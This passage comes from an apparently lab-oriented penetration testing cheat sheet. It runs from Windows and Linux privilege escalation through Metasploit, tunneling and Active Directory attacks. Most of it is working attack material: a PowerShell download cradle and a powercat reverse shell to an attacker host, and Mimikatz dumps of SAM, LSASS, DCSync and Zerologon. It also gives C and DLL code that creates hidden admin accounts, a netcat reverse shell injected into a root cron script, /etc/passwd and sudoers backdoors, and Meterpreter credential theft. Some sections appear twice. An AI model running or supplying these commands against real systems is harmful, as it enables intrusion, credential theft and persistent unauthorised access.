			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://attacker.ip</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
~~~

## 3. PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file

~~~
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
~~~

~~~
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[Kali-IP]:8000/powercat.ps1'); powercat -c [Kali-IP] -p 4444 -e powershell"
~~~


# Mimikatz

~~~ bash
root@kali:~# mimikatz -h

> mimikatz ~ Uses admin rights on Windows to display passwords in plaintext

/usr/share/windows-resources/mimikatz
|-- Win32
|   |-- mimidrv.sys
|   |-- mimikatz.exe
|   |-- mimilib.dll
|   |-- mimilove.exe
|   `-- mimispool.dll
|-- kiwi_passwords.yar
|-- mimicom.idl
`-- x64
    |-- mimidrv.sys
    |-- mimikatz.exe
    |-- mimilib.dll
    `-- mimispool.dll
~~~

## Dump SAM(Get local user NTLM hashes)

~~~ powershell
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
~~~

## Windows NTLM(-m 1000) cracking

~~~ bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashcat/rules/best64.rule
~~~

## Dump credentials from LSASS

~~~ powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
~~~

## Capture plaintext logon credentials

~~~ powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
~~~

## Reset DC machine account password via Netlogon(CVE-2020-1472)

~~~ powershell
mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$" exit
mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$ /exploit" exit
~~~

## DCSync Attack

~~~
mimikatz # lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:michael /authuser:DC01$ /authdomain:main /authpassword:"" /authntlm
~~~


# LinPEAS

## Serving the linpeas enumeration script

~~~ bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
~~~


## Downloading linpeas and making it executable and execute

~~~ bash
wget http://192.168.119.5/linpeas.sh
chmod a+x ./linpeas.sh
./linpeas.sh
~~~

# Git

## Find .git

~~~ cmd
dir /s /b /ah C:\.git
~~~

## Examining the Git repository

~~~ bash
git status
git log
~~~

## Displaying the differences between the two commits

~~~ bash
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
~~~

# BloodHound

## Custom query

~~~
# Display all computers
MATCH (m:Computer) RETURN m

# Display all users
MATCH (m:User) RETURN m

# Display all active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
~~~

# Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

## Listing chisel server

~~~ bash
chmod a+x chisel
./chisel server -p 8080 --reverse
~~~

## Set up a reverse port forwarding

~~~ powershell
chisel.exe client <Kali-IP>:8080 R:80:172.16.84.241:80
~~~


# Windows Privilege Escalation

## Enumerating Windows

### Base64 encoding/decoding

~~~ powershell
$ pwsh
PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("TEST"))
VABFAFMAVAA=

PS> [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("VABFAFMAVAA="))
TEST
~~~

### Get Local Users/Groups

~~~ powershell
PS> Get-LocalUser
PS> Get-LocalGroup
PS> Get-LocalGroupMember Administrators
~~~

### Listing installed applications

~~~ powershell
PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
~~~

### Get Process's path

~~~ powershell
PS> Get-Process NonStandardProcess | Select-Object Path
~~~

### Files searching

~~~ powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
~~~


### Select String(grep)

~~~ powershell
type result.txt | select-string master
~~~


### Get PowerShell History

~~~ powershell
type (Get-PSReadLineOption).HistorySavePath
~~~

### Invoke Web Request(File download)

~~~ powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
~~~



### Run as other user

~~~ cmd
runas /user:backupadmin cmd
~~~


## Leveraging Windows Services

### Service Binary Hijacking
---

#### Get Running services
~~~ powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
~~~

#### icacls permissions mask
| Mask | Permissions           |
|------|------------------------|
| F    | Full access            |
| M    | Modify access          |
| RX   | Read and execute access|
| R    | Read-only access       |
| W    | Write-only access      |

#### Check service binary permissions

~~~ powershell
icacls "C:\xampp\apache\bin\httpd.exe"
~~~


#### adduser.c code

~~~ c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
~~~

#### Cross-Compile the C Code to a 64-bit application

~~~ bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
~~~


#### Replacing mysqld.exe with our malicious binary

~~~ powershell
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
~~~

#### Attempting to stop the service to restart it

~~~ powershell
net stop mysql
~~~

#### Obtain Startup Type for mysql service

~~~ powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
~~~

#### Checking for reboot privileges

~~~ powershell
whoami /priv
~~~

#### Rebooting the machine

~~~ powershell
shutdown /r /t 0
~~~


### DLL Hijacking
---

#### C++ DLL example code from Microsoft

~~~ c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
~~~


#### Cross-Compile the C++ Code to a 64-bit DLL

~~~ bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
~~~


#### Download compiled DLL

~~~ powershell
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
~~~


### Unquoted Service Paths
---

#### List of services with spaces and missing quotes in the binary path

~~~ powershell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
~~~

~~~ powershell
Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
~~~

#### Create exe-service
~~~ bash
msfvenom -p windows/x64/exec CMD="net user redteam password123! /add && net localgroup Administrators redteam /add" -f exe-service -o Abyss.exe
~~~


#### Restart service

~~~ powershell
Restart-Service AbyssWebServer
~~~


## Abusing Other Windows Components

### Scheduled Tasks

#### Display a list of all scheduled tasks

~~~ powershell
schtasks /query /fo LIST /v | findstr C:\Users
~~~




### Using Exploits

#### Enumerating the Windows version and security patches

~~~ powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
~~~


#### checking our current privileges

~~~ powershell
whoami /priv
~~~


#### Elevating our privileges to SYSTEM([CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release))

~~~ powershell
.\CVE-2023-29360.exe
~~~


#### Downloading SigmaPotato.exe

~~~ powershell
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
~~~

#### Using the SigmaPotato tool to get add a new user to the Administrators localgroup

~~~ powershell
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
~~~


# Linux Privilege Escalation

## Enumerating Linux

### Manual Enumeration


#### Getting the version of the running operating system and architecture

~~~ bash
cat /etc/issue
cat /etc/os-release
uname -a
~~~


#### Listing all cron jobs

~~~ bash
ls -lah /etc/cron*
~~~


#### Listing cron jobs for the current user

~~~ bash
crontab -l
~~~


#### Listing cron jobs for the root user

~~~ bash
sudo crontab -l
~~~


#### Listing all world writable directories

~~~ bash
find / -writable -type d 2>/dev/null
~~~


#### Searching for SUID files

~~~ bash
find / -perm -u=s -type f 2>/dev/null
~~~

#### list of Linux privilege escalation techniques:

- [compendium](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation) by g0tmi1k
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)



### Automated Enumeration


#### Running unix_privesc_check

~~~ bash
./unix-privesc-check standard > output.txt
~~~


## Exposed Confidential Information

### Inspecting User Trails

#### Inspecting Environment Variables

~~~ bash
env
~~~


#### Inspecting .bashrc

~~~ bash
cat .bashrc
~~~


#### Inspecting sudo capabilities

~~~ bash
sudo -l
~~~

#### Add user to sudoers List

~~~ bash
echo 'kali ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
~~~~

#### SetUID to /bin/bash

~~~ bash
chmod u+s /bin/bash
~~~


### Inspecting Service Footprints

#### Harvesting Active Processes for Credentials

~~~ bash
watch -n 1 "ps -aux | grep pass"
~~~

#### Using tcpdump to Perform Password Sniffing

~~~ bash
sudo tcpdump -i lo -A | grep "pass"
~~~


## Insecure File Permissions

### Abusing Cron Jobs

#### Inspecting the cron log file

~~~ bash
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
~~~



#### Inserting a reverse shell one-liner in user_backups.sh

~~~ bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
~~~


### Abusing Password Authentication


#### Escalating privileges by editing /etc/passwd

~~~ bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
~~~


## Insecure System Components

### Abusing Setuid Binaries and Capabilities


#### Manually Enumerating Capabilities

~~~ bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
~~~


#### GTFOBins (list of Unix binaries for post-exploitation): 
[https://gtfobins.github.io/](https://gtfobins.github.io/)




### Abusing Sudo

#### Inspecting current user's sudo permissions

~~~ bash
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
~~~


### Exploiting Kernel Vulnerabilities

#### Gathering general information on the target system

~~~ bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
~~~


#### Gathering kernel and architecture information from our Linux target

~~~ bash
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64
~~~


#### Using searchsploit to find privilege escalation exploits for our target

~~~ bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
~~~


#### PwnKit.sh

~~~ bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
~~~


# Port Redirection and SSH Tunneling

## Port Forwarding with Linux Tools

### Port Forwarding with Socat

~~~ bash
# socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST:RPORT>
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
~~~



## SSH Tunneling

### SSH Local Port Forwarding

#### Running the local port forward command

~~~ bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
~~~


### SSH Dynamic Port Forwarding

#### Opening the SSH dynamic port forward on port 9999

~~~ bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
~~~


#### The Proxychains configuration file, pointing towards the SOCKS proxy set up

~~~ bash
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
~~~

#### connection through the SOCKS proxy using Proxychains

~~~ bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
~~~



### SSH Remote Port Forwarding

#### The SSH remote port forward being set up, connecting to the Kali machine

~~~ bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
~~~

#### Check bounding ports

~~~ bash
ss -ntplu
~~~


### SSH Remote Dynamic Port Forwarding

#### Making the SSH connection with the remote dynamic port forwarding option

~~~ bash
ssh -N -R 9998 kali@192.168.118.4
~~~

#### Editing the Proxychains configuration file to point to the new SOCKS proxy on port 9998

~~~ bash
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
~~~


### Using sshuttle

#### Running sshuttle from our Kali machine

~~~ bash
kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

# smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
~~~



## Port Forwarding with Windows Tools

### ssh.exe

#### Finding ssh.exe

~~~ bash
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>
~~~


### Plink

#### Making an SSH connection

~~~ bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
~~~

#### Download plink.exe

[https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe](https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)


### Netsh

#### The portproxy command being run

~~~ bash
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
~~~

#### netstat showing that TCP/2222 is listening on the external interface

~~~ bash
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING

C:\Windows\system32>
~~~

#### Listing all the portproxy port forwarders set up with Netsh

~~~ bash
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.50.64   2222        10.4.50.215     22
~~~


#### Poking a hole in the Windows Firewall with Netsh

~~~ bash
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.

C:\Windows\system32>
~~~


#### Deleting the firewall rule with Netsh

~~~ bash
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
~~~


#### Deleting the port forwarding rule with Netsh

~~~ bash
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

C:\Windows\Administrator>
~~~



# Tunneling Through Deep Packet Inspection

## DNS Tunneling Theory and Practice

### DNS Tunneling with dnscat2

#### Starting the dnscat2 server

~~~ bash
dnscat2-server feline.corp
~~~


#### The dnscat2 client running on target

~~~ bash
./dnscat feline.corp
~~~



# The Metasploit Framework

## Starting Metasploit listener

~~~ bash
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.119.5
set LPORT 443
set ExitOnSession false
run -j
~~~

## Creating a SOCKS5 proxy(using with proxychains)

~~~ bash
use multi/manage/autoroute
set session 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
~~~

## Creating and initializing the Metasploit database

~~~ bash
kali@kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
~~~

## Confirming database connectivity

~~~ bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
~~~



## Creating workspace pen200

~~~ bash
msf6 > workspace
* default

msf6 > workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
~~~

## Using db_nmap to scan BRUTE2

~~~ bash
msf6 > db_nmap -A 192.168.50.202
~~~


## Display all discovered services

~~~ bash
msf6 > services
msf6 > services -p 8000
~~~

## Searching for all SMB, SSH auxiliary modules in Metasploit

~~~ bash
msf6 > search type:auxiliary smb
msf6 > search type:auxiliary ssh
~~~


## Displaying vulnerabilities identified by Metasploit

~~~ bash
msf6 auxiliary(scanner/smb/smb_version) > vulns
~~~

## Displaying all saved credentials of the database

~~~ bash
msf6 auxiliary(scanner/ssh/ssh_login) > creds
Credentials
===========

host            origin          service       public  private    realm  private_type  JtR Format
----            ------          -------       ------  -------    -----  ------------  ----------
192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate         Password  
~~~


## use exploit/multi/handler

~~~ bash
msf6 > search multi/handler
msf6 > use exploit/multi/handler
~~~


## Display idle time from current user

~~~ bash
meterpreter > idletime
User has been idle for: 9 mins 53 secs
~~~


## Elevate our privileges with getsystem

~~~ bash
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
~~~

## Display list of running processes

~~~ bash
meterpreter > ps
~~~


## Migrate to explorer.exe

~~~ bash
meterpreter > migrate 8052
~~~

## Migrate to a newly spawned Notepad process

~~~ bash
meterpreter > execute -H -f notepad
Process 2720 created.

meterpreter > migrate 2720
[*] Migrating from 8052 to 2720...
[*] Migration completed successfully.

meterpreter > 
~~~
`-H` : the Notepad process was spawned without any visual representation


## Load the Kiwi module and execute creds_msv to retrieve credentials of the system

~~~ bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help

...

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
...
~~~

## Automating Metasploit

### Resource Scripts

#### listener.rc
~~~ rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.173
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
~~~

#### Executing the resource script
~~~ bash
sudo msfconsole -r listener.rc
~~~


#### Listing all resource scripts provided by Metasploit

~~~ bash
ls -l /usr/share/metasploit-framework/scripts/resource
~~~





# Active Directory

## Active Directory - Manual Enumeration

### Enumeration Using Legacy Windows Tools

~~~ powershell
net user /domain
net group /domain
~~~


### Enumerating Active Directory using PowerShell and .NET Classes

#### LDAP path format

~~~
LDAP://HostName[:PortNumber][/DistinguishedName]
~~~

~~~ powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
~~~


### AD Enumeration with PowerView

[https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

~~~ powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
~~~



## Manual Enumeration - Expanding our Repertoire

### Enumerating Operating Systems

~~~ powershell
Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname
~~~




### Getting an Overview - Permissions and Logged on Users

~~~ powershell
PS C:\Tools> Find-LocalAdminAccess

PS C:\Tools\PSTools> Get-NetSession -ComputerName web04

PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
~~~



### Enumeration Through Service Principal Names

#### Listing SPN linked to a certain user account

~~~ powershell
PS C:\Tools>  setspn -L iis_service
~~~

#### Listing the SPN accounts in the domain

~~~ powershell
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
~~~

#### Resolving the domain name

~~~ powershell
PS C:\Tools> nslookup.exe web04.corp.com
~~~

### Enumerating Object Permissions

#### Running Get-ObjectAcl specifying our user

~~~ powershell
PS C:\Tools> Get-ObjectAcl -Identity stephanie
~~~


#### Converting the ObjectISD into name

~~~ powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
~~~

#### Converting the SecurityIdentifier into name

~~~ powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
~~~


#### Enumerating ACLs for the Management Group

~~~ powershell
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
~~~



#### Converting all SIDs that have GenericAll permission on the Management Group

~~~ powershell
PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
~~~


#### Using "net.exe" to add ourselves to domain group

~~~ powershell
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
~~~


#### Running "Get-NetGroup" to enumerate "Management Department"

~~~ powershell
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
~~~


#### Using "net.exe" to remove ourselves from domain group

~~~ powershell
PS C:\Tools> net group "Management Department" stephanie /del /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
~~~

### Enumerating Domain Shares

#### Domain Share Query

~~~ powershell
PS C:\Tools> Find-DomainShare -CheckShareAccess
~~~


#### Listing contents of the SYSVOL share

~~~ powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
~~~


#### Using gpp-decrypt to decrypt the password

~~~ powershell
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
~~~


## Active Directory - Automated Enumeration

### Collecting Data with SharpHound

#### Importing the SharpHound script to memory

~~~ powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1
~~~

#### Running SharpHound to collect domain data

~~~ powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
~~~

### Enumerating Domain Shares

#### Domain Share Query

~~~ powershell
PS C:\Tools> Find-DomainShare -CheckShareAccess
~~~


#### Listing contents of the SYSVOL share

~~~ powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
~~~


#### Using gpp-decrypt to decrypt the password

~~~ powershell
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
~~~

#### Find-InterestingDomainAcl

~~~ powershell
PS C:\Tools> Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,AceType,ObjectDN
~~~


## Active Directory - Automated Enumeration

### Collecting Data with SharpHound

#### Importing the SharpHound script to memory

~~~ powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1
~~~

#### Running SharpHound to collect domain data

~~~ powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
~~~

#### Analysing Data using BloodHound

~~~ bash
kali@kali:~$ sudo neo4j start
~~~


#### Starting BloodHound in Kali Linux

[https://github.com/SpecterOps/BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy)

~~~ bash
chmod +x ./BloodHound
./BloodHound --disable-gpu
~~~

~~~ powershell
# =====================TargetA(WIN)
PS C:\Tools> net user robert Password123! /domain
